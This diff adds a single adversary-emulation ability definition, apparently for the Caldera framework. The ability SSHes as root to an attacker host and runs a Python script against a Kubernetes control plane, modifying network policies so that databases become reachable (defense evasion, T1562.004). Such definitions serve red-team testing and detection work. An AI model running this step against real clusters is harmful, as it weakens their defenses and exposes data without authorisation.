@@ -1,0 +1,17 @@
+- id: 40000000-0000-0000-0000-000000000407
+  name: KC4-407 - Network policies modification
+  description: Modification on the network policies of the cluster to gain access to DBs.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.004
+    name: 'Impair Defenses: Disable or Modify System Firewall'
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: ssh -p 4222 root@$(cat $DATA_PATH/KC4/attackaddr) "NP_MODIFICATION_STRICT=true /usr/bin/env python3 - https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
+          < /opt/caldera/KC4/np-modification.py
+        timeout: 900
+        parsers: []
+        cleanup: ''
